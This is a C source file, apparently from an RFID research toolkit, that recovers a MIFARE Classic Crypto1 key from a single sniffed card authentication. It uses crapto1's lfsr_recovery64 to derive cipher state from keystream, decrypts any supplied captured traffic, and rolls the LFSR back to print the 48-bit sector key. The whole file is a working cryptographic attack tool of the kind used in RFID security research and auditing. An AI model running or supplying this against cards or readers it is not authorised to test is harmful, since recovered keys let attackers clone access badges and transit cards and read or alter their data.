#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "crapto1.h"

static int hex_digit(char value) {
    if (value >= '0' && value <= '9') return value - '0';
    if (value >= 'a' && value <= 'f') return value - 'a' + 10;
    if (value >= 'A' && value <= 'F') return value - 'A' + 10;
    return -1;
}

static bool parse_word(const char *text, uint32_t *value) {
    size_t length = strlen(text);
    if (length == 0 || length > 8) return false;
    *value = 0;
    for (size_t i = 0; i < length; i++) {
        int digit = hex_digit(text[i]);
        if (digit < 0) return false;
        *value = (*value << 4) | (uint32_t)digit;
    }
    return true;
}

int main(int argc, char *argv[]) {
    struct Crypto1State *revstate = NULL;
    uint64_t key;     // recovered key
    uint32_t uid;     // serial number
    uint32_t nt;      // tag challenge
    uint32_t nr_enc;  // encrypted reader challenge
    uint32_t ar_enc;  // encrypted reader response
    uint32_t at_enc;  // encrypted tag response
    uint32_t ks2;     // keystream used to encrypt reader response
    uint32_t ks3;     // keystream used to encrypt tag response

    printf("MIFARE Classic key recovery - based 64 bits of keystream\n");
    printf("Recover key from only one complete authentication!\n\n");

    if (argc < 6) {
        printf(" syntax: %s <uid> <nt> <{nr}> <{ar}> <{at}> [enc...]\n\n", argv[0]);
        return 1;
    }

    if (!parse_word(argv[1], &uid) || !parse_word(argv[2], &nt) ||
        !parse_word(argv[3], &nr_enc) || !parse_word(argv[4], &ar_enc) ||
        !parse_word(argv[5], &at_enc)) {
        fprintf(stderr, "Authentication fields require hexadecimal values of at most 32 bits\n");
        return EXIT_FAILURE;
    }

    int status = EXIT_FAILURE;
    int encc = argc - 6;
    size_t *enclen = NULL;
    uint8_t **enc = NULL;
    if (encc > 0) {
        enclen = calloc((size_t)encc, sizeof(*enclen));
        enc = calloc((size_t)encc, sizeof(*enc));
        if (enclen == NULL || enc == NULL) goto cleanup;
    }
    for (int i = 0; i < encc; i++) {
        size_t length = strlen(argv[i + 6]);
        if (length % 2 != 0) {
            fprintf(stderr, "Encrypted data must contain complete hexadecimal bytes\n");
            goto cleanup;
        }
        enclen[i] = length / 2;
        if (enclen[i] > 0) {
            enc[i] = malloc(enclen[i]);
            if (enc[i] == NULL) goto cleanup;
        }
        for (size_t i2 = 0; i2 < enclen[i]; i2++) {
            int high = hex_digit(argv[i + 6][i2 * 2]);
            int low = hex_digit(argv[i + 6][i2 * 2 + 1]);
            if (high < 0 || low < 0) {
                fprintf(stderr, "Encrypted data must be hexadecimal\n");
                goto cleanup;
            }
            enc[i][i2] = (uint8_t)((high << 4) | low);
        }
    }

    printf("Recovering key for:\n");

    printf("  uid: %08x\n", uid);
    printf("   nt: %08x\n", nt);
    printf(" {nr}: %08x\n", nr_enc);
    printf(" {ar}: %08x\n", ar_enc);
    printf(" {at}: %08x\n", at_enc);

    for (int i = 0; i < encc; i++) {
        printf("{enc%d}: ", i);
        for (size_t i2 = 0; i2 < enclen[i]; i2++) {
            printf("%02x", enc[i][i2]);
        }
        printf("\n");
    }

    // Generate lfsr successors of the tag challenge
    printf("\nLFSR successors of the tag challenge:\n");
    uint32_t p64 = prng_successor(nt, 64);
    printf("  nt': %08x\n", p64);
    printf(" nt'': %08x\n", prng_successor(p64, 32));

    // Extract the keystream from the messages
    printf("\nKeystream used to generate {ar} and {at}:\n");
    ks2 = ar_enc ^ p64;
    ks3 = at_enc ^ prng_successor(p64, 32);
    printf("  ks2: %08x\n", ks2);
    printf("  ks3: %08x\n", ks3);

    revstate = lfsr_recovery64(ks2, ks3);
    if (revstate == NULL || (revstate->odd == 0 && revstate->even == 0)) {
        fprintf(stderr, "No recovery state found\n");
        goto cleanup;
    }

    // Decrypting communication using keystream if presented
    if (argc > 6) {
        printf("\nDecrypted communication:\n");
        uint8_t ks4;
        size_t rollb = 0;
        for (int i = 0; i < encc; i++) {
            printf("{dec%d}: ", i);
            for (size_t i2 = 0; i2 < enclen[i]; i2++) {
                ks4 = crypto1_byte(revstate, 0, 0);
                printf("%02x", ks4 ^ enc[i][i2]);
                rollb += 1;
            }
            printf("\n");
        }
        for (size_t i = 0; i < rollb; i++)
            lfsr_rollback_byte(revstate, 0, 0);
    }

    lfsr_rollback_word(revstate, 0, 0);
    lfsr_rollback_word(revstate, 0, 0);
    lfsr_rollback_word(revstate, nr_enc, 1);
    lfsr_rollback_word(revstate, uid ^ nt, 0);
    crypto1_get_lfsr(revstate, &key);
    printf("\nFound Key: [%012" PRIx64 "]\n\n", key);
    status = EXIT_SUCCESS;
cleanup:
    if (enc != NULL) {
        for (int i = 0; i < encc; i++) free(enc[i]);
    }
    free(enc);
    free(enclen);
    crypto1_destroy(revstate);
    return status;
}
